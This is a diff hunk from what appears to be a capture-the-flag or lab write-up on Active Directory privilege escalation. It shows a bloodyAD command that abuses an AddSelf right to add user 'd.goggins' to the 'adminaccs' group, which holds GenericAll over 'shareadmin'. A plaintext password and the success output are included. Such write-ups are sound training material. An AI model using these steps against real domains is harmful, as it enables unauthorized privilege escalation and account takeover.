@@ -602,5 +602,17 @@ Looks like i have AddSelf on a group called `adminaccs`
 
 And this group has GenericAll on the `shareadmin`
 
-# Adding `d.gog`
+# Adding `d.goggins` to `adminaccs` group
+
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' add groupMember 'adminaccs' 'd.goggins' 
+
+[+] d.goggins added to adminaccs
+```
+
+Now the user is in the account i will have GenericAll over the `shareadmin`
+
+```python
+
+```
 
